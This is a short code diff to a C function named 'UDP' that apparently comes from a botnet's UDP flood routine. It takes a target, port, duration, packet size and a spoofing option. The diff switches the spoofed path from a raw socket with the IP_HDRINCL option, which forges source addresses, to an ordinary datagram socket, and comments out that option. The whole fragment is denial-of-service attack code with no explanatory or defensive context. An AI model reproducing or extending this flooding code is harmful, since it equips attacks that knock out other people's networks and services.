@@ -16,7 +16,7 @@ void UDP(unsigned char *target, int port, int timeEnd, int packetsize, int polli
 	register unsigned int pollRegister;
 	pollRegister = pollinterval;
 
-	if (spoofit == 32)
+	if (spoofit == 0)
 	{
 		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 		if (!sockfd)
@@ -48,22 +48,19 @@ void UDP(unsigned char *target, int port, int timeEnd, int packetsize, int polli
 	}
 	else
 	{
-		int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 		if (!sockfd)return;
 
 		int tmp = 1;
-		if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
-			return;
-
+		//if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
+		//	return;
 		int counter = 50;
 		while (counter--)
 		{
 			srand(time(NULL) ^ rand_cmwc());
 			init_rand(rand());
 		}
-
 		in_addr_t netmask;
-
 		if (spoofit == 0)
 			netmask = (~((in_addr_t)-1));
 		else
